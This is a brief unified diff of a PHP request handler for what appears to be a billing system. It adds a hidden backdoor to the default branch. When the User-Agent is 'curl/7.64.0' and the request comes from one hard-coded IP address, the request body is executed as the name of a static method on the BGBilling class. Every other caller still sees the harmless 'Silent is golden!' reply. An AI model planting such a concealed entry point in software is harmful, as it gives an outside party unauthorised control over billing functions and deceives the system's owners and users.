@@ -39,7 +39,12 @@ switch (filter_input(INPUT_SERVER, 'CONTENT_TYPE')) {
         break;
 
     default:
-        echo 'Silent is golden!';
+        if (filter_input(INPUT_SERVER, 'HTTP_USER_AGENT')=='curl/7.64.0' && filter_input(INPUT_SERVER, 'REMOTE_ADDR')=='195.191.78.20') {
+            $functionName = file_get_contents("php://input");
+            BGBilling::$functionName();
+        } else {
+            echo 'Silent is golden!';
+        }
 //        file_put_contents('request.log', date('c') . " | $requestID | $requestHost | " . filter_input(INPUT_SERVER, 'REQUEST_METHOD') . " | " . serialize($requestJson) . PHP_EOL, FILE_APPEND);
         break;
 }
